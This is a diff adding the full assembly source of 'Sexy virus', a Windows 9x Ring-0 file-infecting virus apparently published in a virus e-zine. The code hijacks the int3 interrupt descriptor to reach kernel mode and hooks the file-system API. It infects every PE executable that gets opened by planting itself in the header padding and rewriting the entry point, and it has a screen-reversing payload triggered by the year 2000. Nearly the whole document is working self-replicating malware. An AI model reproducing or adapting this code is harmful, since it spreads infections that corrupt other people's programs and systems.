@@ -1,0 +1,368 @@
+
+;============;
+; Sexy virus ;
+;  v 2.0.33  ;
+;============;
+
+
+; CAREFUL!
+; THE SIZE OF THIS VIRUS *MUST* BE MULTIPLE OF 4
+
+; [* This virus is the first one i know to have a graphical payload
+; in Ring-0. What it does is very interesting: it reverses *ALL*
+; the screen contents. Heh, it's as flip payload but in Ring-0. I
+; must thank to Super for bugfixing this virus, and let us publish
+; it in our e-zine. - BB *]
+
+;===================================================================
+
+ .486p
+ locals
+ jumps
+ .model flat,STDCALL
+
+L equ <LARGE>
+
+;-------------------------------------------------------------------
+
+VxDCall macro vxd_id,service_id
+ int 20h
+ dw service_id
+ dw vxd_id
+endm
+
+VxDJmp macro vxd_id,service_id
+ int 20h
+ dw (8000h+service_id)
+ dw vxd_id
+endm
+
+
+VMM equ 0001h
+MapPhysToLinear equ 006ch
+
+VDD equ 000ah
+Get_DisplayInfo equ 0014h
+
+CONFIGMG equ 0033h
+Get_Alloc_Config equ 003bh
+
+IFSMGR equ 0040h
+GetHeap equ 000dh
+InstallFileSystemAPIhook equ 0067h
+Ring0_FileIO equ 0032h
+
+
+;===================================================================
+.data
+
+ db 'This is my second ring0 virus.'
+ db 'A contribution for DDT#1'
+
+;===================================================================
+.code
+
+start:
+;   int 3
+   pushad ;save all regs
+   call main
+
+;------------------------------------------------
+
+install_ring0:
+   fstp real8 ptr [edi-4]   ;restore int3 descriptor form copro stack
+                            ; (and leave copro stack as before)
+
+;   int 3
+
+   cmp ah,[edi]
+   jz check_year ;it's already resident
+
+   mov [edi],ah
+
+   push L (2200h+virlength) ;number of bytes to reserve from heap
+
+   fld real8 ptr [esi] ;save instruction in copro stack
+fix1:
+   VxDCall IFSMGR,GetHeap ;allocate memory
+
+   fst real8 ptr [esi] ;restore instruction from copro stack
+                       ;value is *not* extracted from copro stack yet
+
+   pop ecx
+   sub esi,(fix1-start) ;esi=virus start
+   mov ch,(end_code-start)/100h
+   xchg edi,eax ;edi=offset of reserved memory
+   rep movsb ;copy virus to memory
+
+   lea eax,[edi-(end_code-API_hook)]
+   push eax
+   VxDCall IFSMGR,InstallFileSystemAPIhook ;install api hook
+   pop esi
+
+   xchg esi,eax ;points to offset 4 of the newly created hook_info struct
+
+;the hook_info struct looks like this:
+; offset 0=address of hook_handler
+;          (the one that this struct represents)
+; offset 4=address of previous hook_handler
+;          (the one that was installed before)
+; offset 8=address of previous hook_info structure
+;          (the one that was installed before)
+
+
+   movsd ;save previous hook_handler
+
+search_api_chain:
+   lodsd ;get offset of previous hook_info structure
+   xchg esi,eax ;esi=previous hook_info structure
+   add esi,8 ;esi=third dword in structure
+   js search_api_chain
+
+;eax=Should point after the hook info struc of default handler.
+;    After this structure is a variable that contains the address
+;    of the lattest installed hook_info structure (top in the chain)
+
+   stosd ;save offset that holds top chain
+
+   fstp real8 ptr [edi]       ;
+   mov word ptr [edi+2],8032h ; create dinamic call
+                              ; to call ifsmgr_ring0_fileio
+
+check_year:
+   mov al,9
+   out 70h,al
+   in al,71h
+   or al,al ;year 2000?
+   jnz back_to_ring3
+
+payload:
+
+   enter 666,0
+
+   mov ch,2
+   lea eax,[ebp-50h]
+   VxDCall VDD,Get_DisplayInfo
+
+   mov edi,esp
+   push L 0
+   push dword ptr [ebp-50h+4]
+   push edi
+   VxDCall CONFIGMG,Get_Alloc_Config
+   pop edi
+
+   movzx eax,word ptr [ebp-50h+18h]
+   movzx ebx,word ptr [ebp-50h+1ah]
+   movzx ecx,byte ptr [ebp-50h+1fh]
+   shr ecx,3
+   mul ebx
+   mul ecx
+   xchg esi,eax
+
+   pushad
+   push edx
+   push esi
+   push dword ptr [edi+0eh]
+   VxDCall VMM,MapPhysToLinear
+   add esp,0ch+4
+   push eax
+   popad
+
+   add esi,edi
+
+bucle1:
+   push ecx
+   sub esi,ecx
+bucle2:
+   mov al,[edi]
+   movsb
+   mov [esi-1],al
+   loop bucle2
+   pop ecx
+   sub esi,ecx
+   cmp esi,edi
+   ja bucle1
+
+   leave
+
+back_to_ring3:
+   iret ;bye bye, ring0
+
+;------------------------------------------------
+
+get_delta:
+   cld
+   pop esi
+   movsd ;copy in stack the address of previous handler so as to return later
+
+   lodsd
+   xchg edx,[eax] ;make top chain null, there will be no file monitor active
+   pushad
+
+   xchg ebp,esi ;ebp="vxdjmp ifsmgr_ring0_fileio"
+   lea edi,[ebp+(buffer-r0fio)] ;edi=start of buffer to read/write file
+
+   jnz exit2 ;its not the open function
+
+   push edi
+   push edi
+
+convert:
+   movsb ;convert it to asciiz format
+   dec edi
+   cmpsb
+   jnz convert
+
+   pop esi
+   pop edi
+
+   xor eax,eax
+   mov ah,0d5h ;r0_opencreatefile
+   cdq
+   inc edx ;if file exists, then open the file
+   lea ebx,[edx+2-1] ;read/write access
+   call ebp ;open file
+   jb exit2
+
+   xor ebx,ebx
+   mov bh,0d6h ;r0_readfile
+   xchg ebx,eax
+   cdq ;edx=0=filepointer
+   xor ecx,ecx
+   mov ch,20h ;ecx=2000h bytes to read
+
+   pushad
+   call ebp ;read from file
+
+   sub eax,ecx ;have we read 2000h bytes?
+   jnz error ;nope, exit
+
+   cmp word ptr [esi],'ZM'
+   jnz error ;its not a MZ header
+
+   mov ebx,[esi+3ch]
+   add ebx,esi
+
+   cmp ecx,[ebx+54h]
+   jna error
+   mov ecx,[ebx+54h] ;size of file header
+   shr ecx,2
+search_more:
+   repnz scasd
+   jecxz error
+   cdq
+check_zeros:
+   dec edx
+   scasd
+   loopz check_zeros
+   cmp edx,-((virlength+7)/4)
+   jg search_more
+   push -((virlength+3)/4)
+   pop ecx
+   lea eax,[edi-4]
+   sub eax,esi
+   lea edx,[eax-(virlength-(4+fix2-start))]
+   lea eax,[eax+ecx*4]
+   xchg eax,[ebx+28h]  ;set new entrypoint
+   sub eax,edx
+   mov [ebp-(r0fio-fix2)],eax
+copy_virus:
+   mov edx,[esi+ecx*4-(buffer-end_code)]
+   mov [edi+ecx*4 -4],edx
+   inc ecx
+   jnz copy_virus
+   cmp byte ptr [ebx],'P'
+error:
+   popad
+   jnz closefile ;error, exit
+
+   inc eax ;r0_writefile
+   call ebp ;write header+virus = 2000h bytes
+
+closefile:
+   mov ah,0d7h ;r0_closefile
+   call ebp
+
+exit2:
+   popad
+   mov [eax],edx ;restore top api chain
+
+exit:
+   popad
+_ret:
+   ret ;jump to previous hook
+
+;------------------------------------------------
+
+main:
+   mov ecx,cs
+   pop eax ;eax=start of ring0 code
+   xor cl,cl
+   jecxz jump_host ;jump if winNT
+
+   lea esi,[eax+(fix1-install_ring0)] ;esi=instruction to patch
+
+   push edi
+   sidt fword ptr [esp-2]
+   pop edi ;edi=start of IDT
+
+   add edi,8*3h ;edi=int3 descriptor
+
+   fld real8 ptr [edi] ;save in coprocessor stack this descriptor
+
+   cld
+
+   stosw         ;
+   scasw         ; create an intgate descriptor
+   mov ah,0eeh   ;
+   mov [edi],eax ;
+
+   push ds
+   push es
+   int 3h   ;jump to ring-0 !
+   pop es
+   pop ds
+
+jump_host:
+   popad ;restore all regs
+
+   db 0e9h ;jump to host entrypoint
+fix2 dd (_ret-fix2-4)
+
+;------------------------------------------------
+
+db '[Im 2 Sexy]'
+
+;------------------------------------------------
+
+API_hook:
+   push eax ;reserve space in stack to copy the address to next handler
+   pushad
+
+   lea edi,[esp+20h]
+   mov ebx,[edi+4+18h] ;get ioreq structure
+   xor edx,edx
+   mov ebp,[ebx+2ch] ;ebp=filename in unicode format
+   cmp byte ptr [edi+4+08h],24h ; is this a file open?
+
+   call get_delta
+
+;------------------------------------------------
+
+end_code:
+
+virlength equ ($-start)
+
+old_API dd ?
+api_chain dd ?
+
+r0fio:
+   VxDJmp IFSMGR,Ring0_FileIO
+
+buffer:
+
+;-------------------------------------------------------------------
+
+ends
+end start
+
